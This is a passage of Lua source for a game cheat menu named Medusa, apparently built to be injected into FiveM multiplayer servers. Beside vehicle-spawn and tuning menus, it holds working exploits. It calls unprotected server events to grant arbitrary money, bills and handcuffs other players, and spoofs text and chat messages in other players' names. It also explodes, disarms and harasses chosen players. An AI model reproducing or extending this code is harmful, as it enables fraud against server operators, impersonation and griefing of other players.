			Medusa.Display()
		elseif Medusa.IsMenuOpened('localmuscle') then
			for i = 1, #VehicleClass.muscle do
				local modelName = VehicleClass.muscle[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if Medusa.Button(vehname) then
					SpawnLocalVehicle(modelName, Medusa.Toggle.ReplaceVehicle, Medusa.Toggle.SpawnInVehicle)
				end
			end

			Medusa.DrawVehiclePreview('muscle')
			Medusa.Display()
		elseif Medusa.IsMenuOpened('localsportsclassics') then
			for i = 1, #VehicleClass.sportsclassics do
				local modelName = VehicleClass.sportsclassics[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if Medusa.Button(vehname) then
					SpawnLocalVehicle(modelName, Medusa.Toggle.ReplaceVehicle, Medusa.Toggle.SpawnInVehicle)
				end
			end

			Medusa.DrawVehiclePreview('sportsclassics')
			Medusa.Display()
		elseif Medusa.IsMenuOpened('localsports') then
			for i = 1, #VehicleClass.sports do
				local modelName = VehicleClass.sports[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if Medusa.Button(vehname) then
					SpawnLocalVehicle(modelName, Medusa.Toggle.ReplaceVehicle, Medusa.Toggle.SpawnInVehicle)
				end
			end

			Medusa.DrawVehiclePreview('sports')
			Medusa.Display()
		elseif Medusa.IsMenuOpened('localsuper') then
			for i = 1, #VehicleClass.super do
				local modelName = VehicleClass.super[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if Medusa.Button(vehname) then
					SpawnLocalVehicle(modelName, Medusa.Toggle.ReplaceVehicle, Medusa.Toggle.SpawnInVehicle)
				end
			end

			Medusa.DrawVehiclePreview('super')
			Medusa.Display()
		elseif Medusa.IsMenuOpened('localmotorcycles') then
			for i = 1, #VehicleClass.motorcycles do
				local modelName = VehicleClass.motorcycles[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if Medusa.Button(vehname) then
					SpawnLocalVehicle(modelName, Medusa.Toggle.ReplaceVehicle, Medusa.Toggle.SpawnInVehicle)
				end
			end

			Medusa.DrawVehiclePreview('motorcycles')
			Medusa.Display()
		elseif Medusa.IsMenuOpened('localoffroad') then
			for i = 1, #VehicleClass.offroad do
				local modelName = VehicleClass.offroad[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if Medusa.Button(vehname) then
					SpawnLocalVehicle(modelName, Medusa.Toggle.ReplaceVehicle, Medusa.Toggle.SpawnInVehicle)
				end
			end

			Medusa.DrawVehiclePreview('offroad')
			Medusa.Display()
		elseif Medusa.IsMenuOpened('localindustrial') then
			for i = 1, #VehicleClass.industrial do
				local modelName = VehicleClass.industrial[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if Medusa.Button(vehname) then
					SpawnLocalVehicle(modelName, Medusa.Toggle.ReplaceVehicle, Medusa.Toggle.SpawnInVehicle)
				end
			end

			Medusa.DrawVehiclePreview('industrial')
			Medusa.Display()
		elseif Medusa.IsMenuOpened('localutility') then
			for i = 1, #VehicleClass.utility do
				local modelName = VehicleClass.utility[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if Medusa.Button(vehname) then
					SpawnLocalVehicle(modelName, Medusa.Toggle.ReplaceVehicle, Medusa.Toggle.SpawnInVehicle)
				end
			end

			Medusa.DrawVehiclePreview('utility')
			Medusa.Display()
		elseif Medusa.IsMenuOpened('localvans') then
			for i = 1, #VehicleClass.vans do
				local modelName = VehicleClass.vans[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if Medusa.Button(vehname) then
					SpawnLocalVehicle(modelName, Medusa.Toggle.ReplaceVehicle, Medusa.Toggle.SpawnInVehicle)
				end
			end

			Medusa.DrawVehiclePreview('vans')
			Medusa.Display()
		elseif Medusa.IsMenuOpened('localcycles') then
			for i = 1, #VehicleClass.cycles do
				local modelName = VehicleClass.cycles[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if Medusa.Button(vehname) then
					SpawnLocalVehicle(modelName, Medusa.Toggle.ReplaceVehicle, Medusa.Toggle.SpawnInVehicle)
				end
			end

			Medusa.DrawVehiclePreview('cycles')
			Medusa.Display()
		elseif Medusa.IsMenuOpened('localboats') then
			for i = 1, #VehicleClass.boats do
				local modelName = VehicleClass.boats[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if Medusa.Button(vehname) then
					SpawnLocalVehicle(modelName, Medusa.Toggle.ReplaceVehicle, Medusa.Toggle.SpawnInVehicle)
				end
			end

			Medusa.DrawVehiclePreview('boats')
			Medusa.Display()
		elseif Medusa.IsMenuOpened('localhelicopters') then
			for i = 1, #VehicleClass.helicopters do
				local modelName = VehicleClass.helicopters[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if Medusa.Button(vehname) then
					SpawnLocalVehicle(modelName, Medusa.Toggle.ReplaceVehicle, Medusa.Toggle.SpawnInVehicle)
				end
			end

			Medusa.DrawVehiclePreview('helicopters')
			Medusa.Display()
		elseif Medusa.IsMenuOpened('localplanes') then
			for i = 1, #VehicleClass.planes do
				local modelName = VehicleClass.planes[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if Medusa.Button(vehname) then
					SpawnLocalVehicle(modelName, Medusa.Toggle.ReplaceVehicle, Medusa.Toggle.SpawnInVehicle)
				end
			end

			Medusa.DrawVehiclePreview('planes')
			Medusa.Display()
		elseif Medusa.IsMenuOpened('localservice') then
			for i = 1, #VehicleClass.service do
				local modelName = VehicleClass.service[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if Medusa.Button(vehname) then
					SpawnLocalVehicle(modelName, Medusa.Toggle.ReplaceVehicle, Medusa.Toggle.SpawnInVehicle)
				end
			end

			Medusa.DrawVehiclePreview('service')
			Medusa.Display()
		elseif Medusa.IsMenuOpened('localcommercial') then
			for i = 1, #VehicleClass.commercial do
				local modelName = VehicleClass.commercial[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if Medusa.Button(vehname) then
					SpawnLocalVehicle(modelName, Medusa.Toggle.ReplaceVehicle, Medusa.Toggle.SpawnInVehicle)
				end
			end

			Medusa.DrawVehiclePreview('commercial')
			Medusa.Display()
		elseif Medusa.IsMenuOpened("LSC") then
			if Medusa.Player.IsInVehicle then
				if Medusa.MenuButton("Bodywork", "lsc_bodywork") then
					LSC.UpdateMods()
				end
				if Medusa.MenuButton("Performance Tuning", "lsc_performance") then
					LSC.UpdateMods()
				end
			else
				if Medusa.Button("No vehicle found") then
				end
			end

			Medusa.Display()
		elseif Medusa.IsMenuOpened("lsc_bodywork") then
			local installed = currentMods
			if Medusa.Player.IsInVehicle then
				for i, mod in pairs(LSC.vehicleMods) do
					SetVehicleModKit(Medusa.Player.Vehicle, 0)
					local modCount = GetNumVehicleMods(Medusa.Player.Vehicle, mod.id)
					if modCount > 0 then
						if mod.meta == "modFrontWheels" or mod.meta == "modBackWheels" then
							if Medusa.ComboBox(mod.name, LSC.WheelType, installed['wheels'], function(selectedIndex, selectedItem)
								selectedIndex = selectedIndex - 1
								installed['wheels'] = selectedIndex
								SetVehicleWheelType(Medusa.Player.Vehicle, selectedIndex)
								Medusa.SetSubTitle(mod.meta, selectedItem .. " Wheels")
							end, true) then
								if modCount > 0 then
									setMenuVisible(mod.meta, true)
								end
							end
						else
							if Medusa.MenuButton(mod.name, mod.meta) then end
						end
					end

					if mod.meta == "modXenon" then
						if Medusa.CheckBox(mod.name, installed['modXenon']) then
							ToggleVehicleMod(Medusa.Player.Vehicle, 22, not installed['modXenon'])
							LSC.UpdateMods()
						end

						if installed['modXenon'] then
							if Medusa.ComboBox("Xenon Color", ComboOptions.XenonColor.Words, ComboOptions.XenonColor.Selected, function(selectedIndex)	
								if ComboOptions.XenonColor.Selected ~= selectedIndex then
									ComboOptions.XenonColor.Selected = selectedIndex
								end
							end) then
								SetVehicleXenonLightsColour(Medusa.Player.Vehicle, ComboOptions.XenonColor.Values[ComboOptions.XenonColor.Selected])
							end
							
						end
					end
				end
			else
				if Medusa.Button("No vehicle found") then
				end
			end
			Medusa.Display()
		elseif Medusa.IsMenuOpened("lsc_performance") then
			local installed = currentMods
			if Medusa.Player.IsInVehicle then
				SetVehicleModKit(Medusa.Player.Vehicle, 0)
				for i, type in pairs(LSC.perfMods) do
					local modCount = GetNumVehicleMods(Medusa.Player.Vehicle, type.id)
					if modCount > 0 then
						if Medusa.Slider(type.name, VehicleUpgradeWords[modCount], installed[type.meta], function(selectedIndex)
							selectedIndex = selectedIndex - 2
							installed[type.meta] = selectedIndex
							SetVehicleMod(Medusa.Player.Vehicle, type.id, selectedIndex, false)
						end, true) then end
					end
				end

				if Medusa.CheckBox("Turbo", installed['modTurbo'], function(enabled)
					installed['modTurbo'] = enabled
					ToggleVehicleMod(Medusa.Player.Vehicle, 18, enabled)
				end) then end
				
				if Medusa.ComboBox("Engine Power", ComboOptions.EnginePower.Words, ComboOptions.EnginePower.Selected, function(selectedIndex)
					if ComboOptions.EnginePower.Selected ~= selectedIndex then
						ComboOptions.EnginePower.Selected = selectedIndex
						ModifyVehicleTopSpeed(Medusa.Player.Vehicle, ComboOptions.EnginePower.Values[ComboOptions.EnginePower.Selected])
					end
				end) then 
				end

				
			else
				if Medusa.Button("No vehicle found") then
				end
			end

			Medusa.Display()
		elseif Medusa.IsMenuOpened("ServerMenu") then
			Medusa.SetSubTitle("ServerMenu", "Server Options - " .. GetCurrentServerEndpoint())
			if Medusa.MenuButton("ESX Boss Options", "ESXBoss") then end
			if Medusa.MenuButton("Money Options", "ServerMoneyOptions") then end
			if Medusa.MenuButton("ESX Misc Options", "ESXMisc") then end
			if Medusa.MenuButton("ESX Drug Options", "ESXDrugs") then end
			if Medusa.MenuButton("VRP Options", "VRPOptions") then end
			if Medusa.MenuButton("Misc Options", "MiscServerOptions") then end

			Medusa.Display()
			
		elseif Medusa.IsMenuOpened("MenuSettings") then
			--[[if Medusa.MenuButton("Change Color Theme", "MenuSettingsColor") then
			end]]
			if Medusa.CheckBox("Change Position (Free Mouse)", changingPos, function(enabled)
				SetCursorLocation(menus[currentMenu].x, menus[currentMenu].y + 0.04)
				changingPos = enabled
			end) then end
            if Medusa.debug then
                if Medusa.Button("Debug Mode ~g~On") then
                    local key = KeyboardInput("Put your dev key", "", 12)
                    if tostring(key) == "205e382633" then
                        Medusa.debug = true
                        Citizen.Wait(1000)
                        Medusa.Functions.Print("Hey Dev enjoy")
                    else
                        Medusa.debug = false
                        Citizen.Wait(1000)
                        Medusa.Functions.Print("Failed Key")
                    end
                end
            else
                if Medusa.Button("Debug Mode ~r~Off") then
                    local key = KeyboardInput("Put your dev key", "", 12)
                    if tostring(key) == "205e382633" then
                        Medusa.debug = true
                        Citizen.Wait(1000)
                        Medusa.Functions.Print("Hey Dev enjoy")
                    else
                        Medusa.debug = false
                        Citizen.Wait(1000)
                        Medusa.Functions.Print("Failed Key")
                    end
                end
            end
			if Medusa.Button("Reset Position") then
				for _key, _value in pairs(menus) do
					_value.x = 0.78
					_value.y = 0.19
				end
			end
			if Medusa.Button("~r~Kill Menu") then
				isMenuEnabled = false
			end
			Medusa.Display()
		elseif Medusa.IsMenuOpened("MenuSettingsColor") then
			if Medusa.CheckBox("Dynamic Theme", dynamicColorTheme, function(enabled) dynamicColorTheme = enabled end) then
			end
			if Medusa.Button("Red", nil, themeColors.red) then
				_menuColor.base = themeColors.red
			end
			if Medusa.Button("Orange", nil, themeColors.orange) then
				_menuColor.base = themeColors.orange
			end
			if Medusa.Button("Yellow", nil, themeColors.yellow) then
				_menuColor.base = themeColors.yellow
			end
			if Medusa.Button("Green", nil, themeColors.green) then
				_menuColor.base = themeColors.green
			end
			if Medusa.Button("Blue", nil, themeColors.blue) then
				_menuColor.base = themeColors.blue
			end
			if Medusa.Button("Purple", nil, themeColors.purple) then
				_menuColor.base = themeColors.purple
			end

			Medusa.Display()
		elseif Medusa.IsMenuOpened("ESXBoss") then

			if Medusa.Button("~c~Mechanic") then
				TriggerEvent("esx_society:openBossMenu", "mecano", function(data, menu) setMenuVisible(currentMenu, false) end)
				
			elseif Medusa.Button("~b~Police") then
				TriggerEvent("esx_society:openBossMenu","police",function(data, menu) setMenuVisible(currentMenu, false) end)
			elseif Medusa.Button("~r~Ambulance") then
				TriggerEvent("esx_society:openBossMenu","ambulance",function(data, menu) setMenuVisible(currentMenu, false) end)
			elseif Medusa.Button("~y~Taxi") then
				TriggerEvent("esx_society:openBossMenu","taxi",function(data, menu) setMenuVisible(currentMenu, false) end)
			elseif Medusa.Button("~g~Real Estate") then
				TriggerEvent("esx_society:openBossMenu","realestateagent",function(data, menu) setMenuVisible(currentMenu, false) end)
			elseif Medusa.Button("~p~Gang") then
				TriggerEvent("esx_society:openBossMenu","gang",function(data, menu) setMenuVisible(currentMenu, false) end)
			elseif Medusa.Button("~o~Car Dealer") then
				TriggerEvent("esx_society:openBossMenu","cardealer",function(data, menu) setMenuVisible(currentMenu, false) end)
			elseif Medusa.Button("~y~Banker") then
				TriggerEvent("esx_society:openBossMenu","banker",function(data, menu) setMenuVisible(currentMenu, false) end)  
			end

			Medusa.Display()
		
		elseif Medusa.IsMenuOpened("ServerMoneyOptions") then

			if Medusa.Button("~g~ESX ~y~Caution Give Back") then
				local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100000000)
				if result then
					TriggerServerEvent('esx_jobs:caution', 'give_back', result, 0, 0)
				end
			end
			if Medusa.Button("~g~ESX ~y~TruckerJob Pay") then
				local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100000000)
				if result then
					TriggerServerEvent('esx_truckerjob:pay', result)
				end
			end
			if Medusa.Button("~g~ESX ~y~Admin Give Bank") then
				local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100000000)
				if result then
					TriggerServerEvent('AdminMenu:giveBank', result)
				end
			end
			if Medusa.Button("~g~ESX ~y~Admin Give Cash") then
				local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100000000)
				if result then
					TriggerServerEvent('AdminMenu:giveCash', result)
				end
			end
			if Medusa.Button("~g~ESX ~y~GOPostalJob Pay") then
				local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100000000)
				if result then
					TriggerServerEvent("esx_gopostaljob:pay", result)
				end
			end
			if Medusa.Button("~g~ESX ~y~BankerJob Pay") then
				local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100000000)
				if result then
					TriggerServerEvent("esx_banksecurity:pay", result)
				end
			end
			if Medusa.Button("~g~ESX ~y~Slot Machine") then
				local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100000000)
				if result then
					TriggerServerEvent("esx_slotmachine:sv:2", result)
				end
			end

			Medusa.Display()
		
		elseif Medusa.IsMenuOpened("ESXMisc") then

			if Medusa.Button("~w~Set hunger to ~g~100%") then
				TriggerEvent("esx_status:set", "hunger", 1000000)
			elseif Medusa.Button("~w~Set thirst to ~g~100%") then
				TriggerEvent("esx_status:set", "thirst", 1000000)
			elseif Medusa.Button("~g~ESX ~y~Revive ID") then
				local id = KeyboardInput("Enter Player ID", "", 1000)
				if id then
					TriggerServerEvent("esx_ambulancejob:revive", GetPlayerServerId(id))
					TriggerServerEvent("whoapd:revive", GetPlayerServerId(id))
					TriggerServerEvent("paramedic:revive", GetPlayerServerId(id))
					TriggerServerEvent("ems:revive", GetPlayerServerId(id))
				end
			elseif Medusa.Button("Send All Bill (shitlord)") then
				local amount = KeyboardInput("Enter Amount", "", 100000000)
				  local name = KeyboardInput("Enter the name of the Bill", "", 100000000)
				  if amount and name then
					for i = 0, 256 do
						  TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", name, amount)
					end
				end
			elseif Medusa.Button("Handcuff ID") then
				local id = KeyboardInput("Enter Player ID", "", 3)
				if id then
					TriggerServerEvent('esx_policejob:handcuff', GetPlayerServerId(id))
				end
			elseif Medusa.Button("~g~ESX ~w~Get all licenses") then
				TriggerServerEvent('esx_dmvschool:addLicense', dmv)
				TriggerServerEvent('esx_dmvschool:addLicense', drive)
				TriggerServerEvent('esx_dmvschool:addLicense', drive_bike)
				TriggerServerEvent('esx_dmvschool:addLicense', drive_truck)
			end

			Medusa.Display()
		
		elseif Medusa.IsMenuOpened("MiscServerOptions") then

			if Medusa.Button("Send Discord Message") then
				local Message = KeyboardInput("Enter message to send", "", 100)
				TriggerServerEvent("DiscordBot:playerDied", Message, "1337")
				Medusa.SendNotification({text = "Sent message:~n~" .. Message .. "", type = "success"})
			elseif Medusa.Button("Send ambulance alert on waypoint") then
				local playerPed = PlayerPedId()
				if DoesBlipExist(GetFirstBlipInfoId(8)) then
					local blipIterator = GetBlipInfoIdIterator(8)
					local blip = GetFirstBlipInfoId(8, blipIterator)
					WaypointCoords = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector()) --Thanks To Briglair [forum.FiveM.net]
					TriggerServerEvent('esx_addons_gcphone:startCall', 'ambulance', "medical attention required: unconscious citizen!", WaypointCoords)
					Medusa.SendNotification("~g~Ambulance alert sent to waypoint!")
				else
					Medusa.SendNotification("~r~No waypoint set!")
				end

			elseif Medusa.Button("Spoof text message (GCPHONE)") then
				local transmitter = KeyboardInput("Enter transmitting phone number", "", 10)
				local receiver = KeyboardInput("Enter receiving phone number", "", 10)
				local message = KeyboardInput("Enter message to send", "", 100)
				if transmitter then
					if receiver then
						if message then
							TriggerServerEvent('gcPhone:_internalAddMessage', transmitter, receiver, message, 0)
						else
							Medusa.SendNotification("~r~You must specify a message.")
						end
					else
						Medusa.SendNotification("~r~You must specify a receiving number.")
					end
				else
					Medusa.SendNotification("~r~You must specify a transmitting number.")
				end
			elseif Medusa.Button("Spoof Chat Message") then
				local name = KeyboardInput("Enter chat sender name", "", 15)
				local message = KeyboardInput("Enter your message to send", "", 70)
				if name and message then
					TriggerServerEvent('_chat:messageEntered', name, {0, 0x99, 255}, message)
				end
			elseif Medusa.Button("esx_mugging Give item") then
				local itemName = KeyboardInput("Enter item name", "", 20)
				if itemName then
					TriggerServerEvent('esx_mugging:giveItems', (itemName))
					Medusa.SendNotification("Successfully given item ~g~" .. itemName)
				else
					Medusa.SendNotification("~r~You must specify an item")
				end
			end

			Medusa.Display()
		elseif Medusa.IsMenuOpened("OnlinePlayersMenu") then
			onlinePlayerSelected = {}
			
			local plist = GetActivePlayers()
			for i = 1, #plist do
				local id = plist[i]
				local ped = GetPlayerPed(id)
				onlinePlayerSelected[i] = id
				--Medusa.Functions.Print(menus[currentMenu].currentOption == optionCount)
				--Medusa.Functions.Print(menus[currentMenu].currentOption)
				if id ~= PlayerId() then
					if not Medusa.Data.FriendList[GetPlayerServerId(id)] then
						if GetEntityHealth(ped) > 0 then
							if Medusa.MenuButton(("~b~%-4d ~s~%s"):format(GetPlayerServerId(id), GetPlayerName(id)), 'PlayerOptionsMenu') then
								SelectedPlayer = id
							end
						else
							if Medusa.MenuButton(("~r~%-4d ~s~%s"):format(GetPlayerServerId(id), GetPlayerName(id)), 'PlayerOptionsMenu') then
								SelectedPlayer = id
							end
						end
					else
						if GetEntityHealth(ped) > 0 then
							if Medusa.MenuButton(("~b~%-4d ~s~%s ~b~(~g~FRIEND~b~)"):format(GetPlayerServerId(id), GetPlayerName(id)), 'PlayerOptionsMenu') then
								SelectedPlayer = id
							end
						else
							if Medusa.MenuButton(("~r~%-4d ~s~%s ~b~(~g~FRIEND~b~)"):format(GetPlayerServerId(id), GetPlayerName(id)), 'PlayerOptionsMenu') then
								SelectedPlayer = id
							end
						end
					end
				else
					if GetEntityHealth(ped) > 0 then
						if Medusa.MenuButton(("~b~%-4d ~s~%s ~b~(~y~YOU~b~)"):format(GetPlayerServerId(id), GetPlayerName(id)), 'PlayerOptionsMenu') then
							SelectedPlayer = id
						end
					else
						if Medusa.MenuButton(("~r~%-4d ~s~%s ~b~(~y~YOU~b~)"):format(GetPlayerServerId(id), GetPlayerName(id)), 'PlayerOptionsMenu') then
							SelectedPlayer = id
						end
					end	
				end
			end

			local index = menus[currentMenu].currentOption

			Medusa.DrawPlayerInfo(onlinePlayerSelected[index])
			Medusa.Display()
		
		elseif Medusa.IsMenuOpened("PlayerOptionsMenu") then
			local s_id = GetPlayerServerId(SelectedPlayer)
			Medusa.SetSubTitle("PlayerOptionsMenu", "Player Options [" .. GetPlayerName(SelectedPlayer) .. "]")
			
			if Medusa.Button("Spectate", (Medusa.Player.Spectating and "~g~[SPECTATING]")) then
				CreateThreadNow(function()
					SpectatePlayer(SelectedPlayer)
				end)
			end

			if s_id ~= GetPlayerServerId(PlayerId()) then
				if not Medusa.Data.FriendList[s_id] then
					if Medusa.Button("Friend") then
						Medusa.Data.FriendList[s_id] = true
					end
				else
					if Medusa.Button("Unfriend") then
						Medusa.Data.FriendList[s_id] = false
					end
				end
			end

			if Medusa.Button("Teleport To Player") then
				Medusa.Game:TeleportToPlayer(SelectedPlayer)
			end

			if Medusa.Button("Teleport into Vehicle") then
				TeleportToPlayerVehicle(SelectedPlayer)
			end

			if Medusa.MenuButton("Weapon Options", "OnlineWepMenu") then end
			if Medusa.MenuButton("Vehicle Options", "OnlineVehicleMenuPlayer") then end
			if Medusa.MenuButton("ESX Options", "ESXMenuPlayer") then end
			if Medusa.MenuButton("Troll Options", "OnlineTrollMenu") then end
			if Medusa.Button("~r~Silent Explode") then
				AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 2, 100000.0, false, true, 0)
			end
			if Medusa.Button("~y~Explode") then
				AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 2, 100000.0, true, false, 100000.0)
			end
			if Medusa.Button("Give All Weapons") then
				for i = 1, #t_Weapons do
					GiveWeaponToPed(GetPlayerPed(SelectedPlayer), t_Weapons[i][1], 128, false, false)
				end
			end
			if Medusa.Button("Remove All Weapons") then
				local ped = GetPlayerPed(SelectedPlayer)
				RequestControlOnce(ped)
				for i = 1, #t_Weapons do
					RemoveWeaponFromPed(ped, t_Weapons[i][1])
				end

				-- RemoveAllPedWeapons(GetPlayerPedScriptIndex(SelectedPlayer), true)
			end

			Medusa.DrawPlayerInfo(SelectedPlayer)
			Medusa.Display()
		elseif Medusa.IsMenuOpened("OnlineTrollMenu") then

			Medusa.MenuButton("Rain Menu", "RainMenu")
			Medusa.MenuButton("Prop Menu", "PropMenu")

			if Medusa.Button("Rain Spawned Cars") then
				local ped = GetPlayerPed(SelectedPlayer)
				PlaySoundFromEntity(1, "TIMER_STOP", ped, "HUD_MINI_GAME_SOUNDSET", true, 0)
				SetPedScream(ped)

				Medusa.Functions.GetAllVehicles(5, function(carId)
					if DoesEntityExist(carId) then
						SetEntityInvincible(carId, true)
						RequestControlOnce(carId)
						FreezeEntityPosition(carId, false)
						local dx, dy, dz = table.unpack(GetEntityCoords(ped))
						SetEntityCoords(carId, dx, dy, dz + math.random(15, 25), 0.0, 0.0, 0.0, 0.0)
						SetEntityVelocity(carId, 0.0, 0.0, -300.0)
					end
				end)
			end

			if Medusa.Button("Fuck Ped With Spawned Cars") then
				local ped = GetPlayerPed(SelectedPlayer)
				PlaySoundFromEntity(1, "TIMER_STOP", ped, "HUD_MINI_GAME_SOUNDSET", true, 0)
				SetPedScream(ped)
				--PlaySoundFromCoord(1, "Hack_Failed", GetEntityCoords(GetPlayerPed(SelectedPlayer)), "DLC_HEIST_BIOLAB_PREP_HACKING_SOUNDS", true, 50.0, true)

				Medusa.Functions.GetAllVehicles(5, function(carId)
					if DoesEntityExist(carId) then
						SetEntityInvincible(carId, true)
						RequestControlOnce(carId)
						FreezeEntityPosition(carId, false)
						-- local dx, dy, dz = table.unpack(GetEntityCoords(ped))
						-- SetEntityCoords(carId, dx, dy, dz + 20.0, 0.0, 0.0, 0.0, 0.0)
						-- SetEntityVelocity(carId, 0.0, 0.0, -300.0)

						AttachEntityToEntity(carId, ped, GetPedBoneIndex(ped, 31086), -0.1, 0, 0, 0, 90.0, 180.0, true, true, false, true, 1, true)
					end
				end)
			end

			if Medusa.Button("Testbuttonlol") then
				local ped = GetPlayerPed(SelectedPlayer)
				PlaySoundFromEntity(1, "TIMER_STOP", ped, "HUD_MINI_GAME_SOUNDSET", true, 0)
				SetPedScream(ped)
				--PlaySoundFromCoord(1, "Hack_Failed", GetEntityCoords(GetPlayerPed(SelectedPlayer)), "DLC_HEIST_BIOLAB_PREP_HACKING_SOUNDS", true, 50.0, true)

						SetEntityInvincible(ped, true)
						RequestControlOnce(ped)
						FreezeEntityPosition(ped, false)
						SetEntityCoords(ped, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0)

			end

			Medusa.DrawPlayerInfo(SelectedPlayer)
			Medusa.Display()
		elseif Medusa.IsMenuOpened("PropMenu") then
			
			if Medusa.Button("Make Head Washer") then
				Medusa.Functions.HeadProp(GetPlayerPed(SelectedPlayer), "prop_washer_02")
			end

			Medusa.Display()
		elseif Medusa.IsMenuOpened("RainMenu") then 
			if Medusa.MenuButton("Custom Rain", "CustomMenu") then

			end
			if Medusa.MenuButton("Car Rain", "CarMenu") then

			end
			if Medusa.MenuButton("Bike Rain", "BikeMenu") then

			end
			
			Medusa.DrawPlayerInfo(SelectedPlayer)
			Medusa.Display()
		elseif Medusa.IsMenuOpened("CustomMenu") then
			local Amounts = {"1", "2", "5", "10", "15", "25", "35", "50"}
			local ModelVehicle = "None"
			if Medusa.Config.Rain.Custom.model ~= nil then
				ModelVehicle = Medusa.Config.Rain.Custom.model
			end
			--Medusa.Functions.Print(ModelVehicle)
			if Medusa.Config.Rain.Custom.model == nil then
				local ModelName = KeyboardInput("Enter Vehicle Model Name", "", 12)
				if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
					RequestModel(ModelName)
					while not HasModelLoaded(ModelName) do
						Citizen.Wait(0)
					end
					Medusa.Config.Rain.Custom.model = ModelName
				end
			end
			if Medusa.ComboBox("Amount Of Cars", Amounts, Medusa.Data.Rain.RainSelected, function(SelectedItem)
				if Medusa.Data.Rain.RainSelected ~= SelectedItem then
					Medusa.Data.Rain.RainSelected = SelectedItem
					Medusa.Data.Rain.RainAmount =  tonumber(Amounts[Medusa.Data.Rain.RainSelected])
				end
			end) then
				--Medusa.Functions.Print(Medusa.Data.Rain.RainAmount)
			end
			if Medusa.MenuButton("Select ~b~Vehicle~b~", "CustomMenu") then
				local ModelName = KeyboardInput("Enter Vehicle Model Name", "", 12)
				if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
					RequestModel(ModelName)
					while not HasModelLoaded(ModelName) do
						Citizen.Wait(0)
					end
					Medusa.Config.Rain.Custom.model = ModelName
				end
			end
			if Medusa.Button("Vehicle: ~o~"..Medusa.Functions.FirstToUpper(ModelVehicle).."~o~")then

			end
			if Medusa.MenuButton("Rain ~g~Legit~s~", "RainCustoLegit") then

			end
			if Medusa.MenuButton("Rain ~r~ OC~s~", "RainCustoSpam") then

			end
			Medusa.DrawPlayerInfo(SelectedPlayer)
			Medusa.Display()
		elseif Medusa.IsMenuOpened("CarMenu") then
			local Amounts = {"1", "2", "5", "10", "15", "25", "35", "50"}
			local states  = {"Default", "Vandalize"}

			if Medusa.ComboBox("Amount Of Cars", Amounts, Medusa.Data.Rain.RainSelected, function(SelectedItem)
				if Medusa.Data.Rain.RainSelected ~= SelectedItem then
					Medusa.Data.Rain.RainSelected = SelectedItem
					Medusa.Data.Rain.RainAmount =  tonumber(Amounts[Medusa.Data.Rain.RainSelected])
				end
			end) then
				Medusa.Functions.Print(Medusa.Data.Rain.RainAmount)
			end

			if Medusa.MenuButton("Rain ~g~Legit~s~", "RainCarLegit") then

			end
			if Medusa.MenuButton("Rain ~r~ OC~s~", "RainCarSpam") then

			end
			if Medusa.ComboBox("State Of Cars", states, Medusa.Data.Rain.RainStateSelected, function(SelectedItem)
				if Medusa.Data.Rain.RainStateSelected ~= SelectedItem then
					Medusa.Data.Rain.RainStateSelected = SelectedItem
					Medusa.Data.Rain.RainState =  tonumber(Amounts[Medusa.Data.Rain.RainStateSelected])
				end
			end) then
				Medusa.Functions.Print(Medusa.Data.Rain.RainState)
			end

			Medusa.DrawPlayerInfo(SelectedPlayer)
			Medusa.Display()
		elseif Medusa.IsMenuOpened("BikeMenu") then
			local Amounts = {"1", "2", "5", "10", "15", "25", "35", "50"}
			local states  = {"Default", "Vandalize"}

			if Medusa.ComboBox("Amount Of Bikes", Amounts, Medusa.Data.Rain.RainSelected, function(SelectedItem)
				if Medusa.Data.Rain.RainSelected ~= SelectedItem then
					Medusa.Data.Rain.RainSelected = SelectedItem
					Medusa.Data.Rain.RainAmount =  tonumber(Amounts[Medusa.Data.Rain.RainSelected])
				end
			end) then
				Medusa.Functions.Print(Medusa.Data.Rain.RainAmount)
			end

			if Medusa.MenuButton("Rain ~g~Legit~s~", "RainBikeLegit") then

			end
			if Medusa.MenuButton("Rain ~r~ OC~s~", "RainBikesSpam") then

			end
			if Medusa.ComboBox("State Of Bikes", states, Medusa.Data.Rain.RainStateSelected, function(SelectedItem)
				if Medusa.Data.Rain.RainStateSelected ~= SelectedItem then
					Medusa.Data.Rain.RainStateSelected = SelectedItem
					Medusa.Data.Rain.RainState =  tonumber(Amounts[Medusa.Data.Rain.RainStateSelected])
				end
			end) then
				Medusa.Functions.Print(Medusa.Data.Rain.RainState)
			end
			Medusa.DrawPlayerInfo(SelectedPlayer)
			Medusa.Display()
		elseif Medusa.IsMenuOpened("RainBikeLegit") then
			if Medusa.Button("Rain Bikes") then
